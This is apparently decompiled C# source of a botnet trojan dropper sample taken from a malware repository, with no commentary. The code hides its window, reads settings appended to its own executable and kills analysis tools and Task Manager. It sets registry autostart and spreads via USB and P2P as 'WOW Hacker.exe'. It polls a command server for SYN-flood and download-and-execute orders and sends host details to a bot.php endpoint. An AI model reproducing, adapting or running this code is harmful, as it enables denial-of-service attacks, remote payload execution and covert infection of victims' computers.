// Decompiled with JetBrains decompiler
// Type: hdfghfdghdfghfdgh.Form1
// Assembly: fghdfgh, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 59D2BBAC-52A4-41AF-9009-6C20D7F64D35
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Dropper.Win32.Sysn.axbd-19c0d39edbfe66a3ff8170bfe7fc83c000c848bee85291ee0a85269d21b676a2.exe

using hdfghfdghdfghfdgh.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Compatibility.VB6;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace hdfghfdghdfghfdgh
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("tmrrefresh")]
    private System.Windows.Forms.Timer _tmrrefresh;
    private string[] Befehle;
    private FixedLengthString VB6setting;
    private string hwid;
    private string url;
    private string pcname;
    private string os;
    private string splittcommand;
    private string str;
    private string[] strArr;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.VB6setting = new FixedLengthString(500);
      this.pcname = MyProject.Computer.Name;
      this.os = Environment.OSVersion.ToString();
      this.InitializeComponent();
    }

    [STAThread]
    public static void Main() => Application.Run((Form) MyProject.Forms.Form1);

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.tmrrefresh = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.SizeGripStyle = SizeGripStyle.Hide;
      this.Text = nameof (Form1);
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
    }

    internal virtual System.Windows.Forms.Timer tmrrefresh
    {
      [DebuggerNonUserCode] get => this._tmrrefresh;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.tmrrefresh_Tick);
        if (this._tmrrefresh != null)
          this._tmrrefresh.Tick -= eventHandler;
        this._tmrrefresh = value;
        if (this._tmrrefresh == null)
          return;
        this._tmrrefresh.Tick += eventHandler;
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        this.Visible = false;
        this.Hide();
        string executablePath = Application.ExecutablePath;
        string str1 = executablePath.Substring(0, executablePath.IndexOf(".")) + "bp.exe";
        System.IO.File.Copy(executablePath, str1);
        FileSystem.FileOpen(1, str1, OpenMode.Binary);
        FixedLengthString vb6setting = this.VB6setting;
        string str2 = vb6setting.Value;
        FileSystem.FileGet(1, ref str2, checked (FileSystem.LOF(1) - 499L));
        vb6setting.Value = str2;
        FileSystem.FileClose(1);
        this.Befehle = this.VB6setting.Value.Split('~');
        System.IO.File.Delete(str1);
        string str3 = this.Befehle[0];
        string str4 = this.Befehle[1];
        string str5 = this.Befehle[2];
        string str6 = this.Befehle[3];
        string str7 = this.Befehle[4];
        string str8 = this.Befehle[5];
        string str9 = this.Befehle[6];
        string str10 = this.Befehle[7];
        string str11 = this.Befehle[8];
        string spezifischexe = this.Befehle[9];
        string str12 = this.Befehle[10];
        if (Conversions.ToBoolean(Strings.Trim(str5)))
          antis.antis();
        if (Conversions.ToBoolean(Strings.Trim(str6)))
          antis.killwireshark();
        if (Conversions.ToBoolean(Strings.Trim(str7)))
          antis.killtcpview();
        Registry_Autostart.autostart(Strings.Trim(str12));
        if (Conversions.ToBoolean(Strings.Trim(str11)))
          antis.killspzifisch(spezifischexe);
        if (Conversions.ToBoolean(Strings.Trim(str8)))
          spread.usbspread("WOW Hacker.exe");
        if (Conversions.ToBoolean(Strings.Trim(str9)))
          spread.p2pSpread("WOW Hacker.exe");
        if (Conversions.ToBoolean(Strings.Trim(str10)))
          antis.killtaskmanager();
        genhwid.hwidgen();
        this.hwid = MyProject.Computer.FileSystem.ReadAllText(Interaction.Environ("tmp") + "\\tmp.adl");
        this.connect_url(Strings.Trim(str3));
        this.tmrrefresh.Interval = checked ((int) Math.Round(unchecked (Conversions.ToDouble(Strings.Trim(str4)) * 1000.0)));
        this.tmrrefresh.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void connect_url(string seite)
    {
      try
      {
        this.url = Strings.Split(new StreamReader(((HttpWebResponse) ((HttpWebRequest) WebRequest.Create(seite)).GetResponse()).GetResponseStream()).ReadToEnd(), "<div class='snap_preview'><p>")[1].Split('<')[0];
        string url = this.url;
        string str = (string) null;
        int num = checked (url.Length - 2);
        int startIndex = 0;
        while (startIndex <= num)
        {
          str += Conversions.ToString(Strings.Chr(Conversions.ToInteger("&H" + url.Substring(startIndex, 2))));
          checked { startIndex += 2; }
        }
        this.url = str;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void tmrrefresh_Tick(object sender, EventArgs e)
    {
      try
      {
        WebClient webClient = new WebClient();
        string str1 = "Bereit!";
        string str2 = new WebClient().DownloadString(this.url + "/command.txt");
        if (str2.Contains("[syn]"))
        {
          try
          {
            this.str = str2;
            this.strArr = this.str.Split(' ');
            Syn.Host = this.strArr[1];
            Syn.Port = Conversions.ToInteger(this.strArr[2]);
            Syn.Threads = Conversions.ToInteger(this.strArr[3]);
            Syn.SuperSynSockets = Conversions.ToInteger(this.strArr[4]);
            Syn.time = this.strArr[5];
            Syn.StartSuperSyn();
            str1 = "SYN erfolgreich!";
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            str1 = "SYN Fehler!";
            ProjectData.ClearProjectError();
          }
        }
        else if (str2.Contains("[dl]"))
        {
          try
          {
            this.str = str2;
            this.strArr = this.str.Split(' ');
            if (System.IO.File.Exists(Interaction.Environ("tmp") + "\\adler_.exe"))
            {
              System.IO.File.Delete(Interaction.Environ("tmp") + "\\adler_.exe");
              MyProject.Computer.Network.DownloadFile(this.strArr[1], Interaction.Environ("tmp") + "\\adler_.exe");
              Interaction.Shell(Interaction.Environ("tmp") + "\\adler_.exe");
            }
            else
            {
              MyProject.Computer.Network.DownloadFile(this.strArr[1], Interaction.Environ("tmp") + "\\adler_.exe");
              Interaction.Shell(Interaction.Environ("tmp") + "\\adler_.exe");
            }
            str1 = "Download erfolgreich!";
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            str1 = "Download Fehler!";
            ProjectData.ClearProjectError();
          }
        }
        try
        {
          webClient.DownloadString(this.url + "/bot.php?hwid=" + this.hwid + "&pcname=" + this.pcname + "&antwort=" + str1 + "&os=" + this.os + "");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
